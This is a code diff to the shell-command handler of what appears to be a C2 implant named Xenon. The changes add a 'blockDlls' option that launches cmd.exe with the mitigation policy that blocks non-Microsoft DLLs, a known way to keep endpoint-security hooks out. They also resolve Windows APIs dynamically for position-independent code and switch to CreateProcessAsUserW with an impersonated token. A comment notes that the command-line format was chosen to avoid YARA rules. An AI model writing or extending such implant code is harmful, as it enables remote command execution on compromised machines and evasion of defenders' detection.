@@ -6,6 +6,32 @@
 #include "Task.h"
 #include "Config.h"
 #include "Identity.h"
+#include "Xenon.h"
+
+/* ── Types / constants missing from older MinGW headers ─────────────────── */
+
+#ifndef EXTENDED_STARTUPINFO_PRESENT
+#define EXTENDED_STARTUPINFO_PRESENT 0x00080000UL
+#endif
+
+/* ProcThreadAttributeMitigationPolicy=7, Input=TRUE → 0x00020007 */
+#ifndef PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY
+#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY 0x00020007UL
+#endif
+
+/* Mirror of STARTUPINFOEXA / STARTUPINFOEXW — identical layout, avoids SDK dependency */
+typedef struct { STARTUPINFOA StartupInfo; PVOID lpAttributeList; } XENON_SIEX_A;
+typedef struct { STARTUPINFOW StartupInfo; PVOID lpAttributeList; } XENON_SIEX_W;
+
+/* Dynamic function pointer types — required for PIC */
+typedef BOOL (WINAPI* FN_InitProcAttrList)  (PVOID, DWORD, DWORD, PSIZE_T);
+typedef BOOL (WINAPI* FN_UpdateProcAttr)    (PVOID, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
+typedef VOID (WINAPI* FN_DeleteProcAttrList)(PVOID);
+typedef BOOL (WINAPI* FN_CreateProcAsUserW) (HANDLE, LPCWSTR, LPWSTR,
+    LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
+    BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
+
+/* ─────────────────────────────────────────────────────────────────────────── */
 
 #ifdef INCLUDE_CMD_SHELL
 
@@ -33,10 +59,21 @@ VOID ShellCmd(PCHAR taskUuid, PPARSER arguments)
     HANDLE hStdOutWrite     = NULL;
     HANDLE hStdErrRead      = NULL;
     HANDLE hStdErrWrite     = NULL;
-    STARTUPINFOA si         = { 0 };
-    STARTUPINFOW siw        = { 0 };
-    PROCESS_INFORMATION pi  = { 0 };
-    SECURITY_ATTRIBUTES sa  = { 0 };
+    XENON_SIEX_A            siex    = { 0 };
+    XENON_SIEX_W            siexw   = { 0 };
+    PROCESS_INFORMATION     pi      = { 0 };
+    SECURITY_ATTRIBUTES     sa      = { 0 };
+
+    PVOID    pAttrList      = NULL;
+    SIZE_T   attrListSize   = 0;
+    DWORD64  mitigationPolicy = 0x100000000000ULL; /* PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON */
+
+    HMODULE hKernel32 = GetModuleHandleA("kernel32");
+    HMODULE hAdvapi32 = GetModuleHandleA("advapi32");
+    FN_InitProcAttrList   _InitProcAttrList   = (FN_InitProcAttrList)  GetProcAddress(hKernel32, "InitializeProcThreadAttributeList");
+    FN_UpdateProcAttr     _UpdateProcAttr     = (FN_UpdateProcAttr)    GetProcAddress(hKernel32, "UpdateProcThreadAttribute");
+    FN_DeleteProcAttrList _DeleteProcAttrList = (FN_DeleteProcAttrList)GetProcAddress(hKernel32, "DeleteProcThreadAttributeList");
+    FN_CreateProcAsUserW  _CreateProcAsUserW  = (FN_CreateProcAsUserW) GetProcAddress(hAdvapi32, "CreateProcessAsUserW");
     DWORD bytesRead         = 0;
     DWORD bytesAvailable    = 0;
     CHAR cmdLine[8192]      = { 0 };
@@ -67,10 +104,27 @@ VOID ShellCmd(PCHAR taskUuid, PPARSER arguments)
     SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);
     SetHandleInformation(hStdErrRead, HANDLE_FLAG_INHERIT, 0);
 
-    si.cb           = sizeof(STARTUPINFOA);
-    si.hStdOutput   = hStdOutWrite;
-    si.hStdError    = hStdErrWrite;
-    si.dwFlags      |= STARTF_USESTDHANDLES;
+    siex.StartupInfo.cb       = sizeof(STARTUPINFOA);
+    siex.StartupInfo.hStdOutput = hStdOutWrite;
+    siex.StartupInfo.hStdError  = hStdErrWrite;
+    siex.StartupInfo.dwFlags   |= STARTF_USESTDHANDLES;
+
+    /* Build mitigation policy attribute list if blockDlls is enabled */
+    if (xenonConfig->blockDlls && _InitProcAttrList && _UpdateProcAttr)
+    {
+        _InitProcAttrList(NULL, 1, 0, &attrListSize);
+        pAttrList = HeapAlloc(GetProcessHeap(), 0, attrListSize);
+        if (pAttrList)
+        {
+            _InitProcAttrList(pAttrList, 1, 0, &attrListSize);
+            _UpdateProcAttr(pAttrList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
+                &mitigationPolicy, sizeof(mitigationPolicy), NULL, NULL);
+            siex.StartupInfo.cb  = sizeof(XENON_SIEX_A);
+            siex.lpAttributeList = pAttrList;
+        }
+    }
+
+    DWORD dwCreationFlags = CREATE_NO_WINDOW | (pAttrList ? EXTENDED_STARTUPINFO_PRESENT : 0);
 
     /* Construct command line: cmd.exe /c "user_command" */
     snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /d /c \"%s\"", cmd); // To avoid trivial yara rules
@@ -91,35 +145,39 @@ VOID ShellCmd(PCHAR taskUuid, PPARSER arguments)
         }
         
         /* Setup wide character startup info */
-        siw.cb           = sizeof(STARTUPINFOW);
-        siw.hStdOutput   = hStdOutWrite;
-        siw.hStdError    = hStdErrWrite;
-        siw.dwFlags      |= STARTF_USESTDHANDLES;
-        
-        processCreated = CreateProcessWithTokenW(
-            gIdentityToken,   // Token handle
-            0,                // Logon flags
-            NULL,             // Application name
-            cmdLineW,         // Command line (wide char)
-            CREATE_NO_WINDOW, // Creation flags
-            NULL,             // Environment
-            NULL,             // Current directory
-            &siw,             // Startup info (wide char)
-            &pi);             // Process information
+        siexw.StartupInfo.cb        = pAttrList ? sizeof(XENON_SIEX_W) : sizeof(STARTUPINFOW);
+        siexw.StartupInfo.hStdOutput = hStdOutWrite;
+        siexw.StartupInfo.hStdError  = hStdErrWrite;
+        siexw.StartupInfo.dwFlags   |= STARTF_USESTDHANDLES;
+        siexw.lpAttributeList        = pAttrList;
+
+        /* CreateProcessAsUserW supports EXTENDED_STARTUPINFO_PRESENT; CreateProcessWithTokenW does not */
+        processCreated = _CreateProcAsUserW(
+            gIdentityToken,             // Token handle
+            NULL,                       // Application name
+            cmdLineW,                   // Command line (wide char)
+            NULL,                       // Process security attributes
+            NULL,                       // Thread security attributes
+            TRUE,                       // Inherit handles
+            dwCreationFlags,            // Creation flags
+            NULL,                       // Environment
+            NULL,                       // Current directory
+            (LPSTARTUPINFOW)&siexw,     // Startup info
+            &pi);                       // Process information
     }
     else
     {
         processCreated = CreateProcessA(
-            NULL,             // Application name
-            cmdLine,          // Command line
-            NULL,             // Process security attributes
-            NULL,             // Thread security attributes
-            TRUE,             // Inherit handles
-            CREATE_NO_WINDOW, // Creation flags
-            NULL,             // Environment
-            NULL,             // Current directory
-            &si,              // Startup info
-            &pi);             // Process information
+            NULL,                       // Application name
+            cmdLine,                    // Command line
+            NULL,                       // Process security attributes
+            NULL,                       // Thread security attributes
+            TRUE,                       // Inherit handles
+            dwCreationFlags,            // Creation flags
+            NULL,                       // Environment
+            NULL,                       // Current directory
+            (LPSTARTUPINFOA)&siex,      // Startup info
+            &pi);                       // Process information
     }
 
     if ( !processCreated )
@@ -229,6 +287,12 @@ CLEANUP:
     if (hStdErrWrite) CloseHandle(hStdErrWrite);
     if (pi.hProcess) CloseHandle(pi.hProcess);
     if (pi.hThread) CloseHandle(pi.hThread);
+
+    if (pAttrList && _DeleteProcAttrList)
+    {
+        _DeleteProcAttrList(pAttrList);
+        HeapFree(GetProcessHeap(), 0, pAttrList);
+    }
 
     PackageDestroy(temp);
 
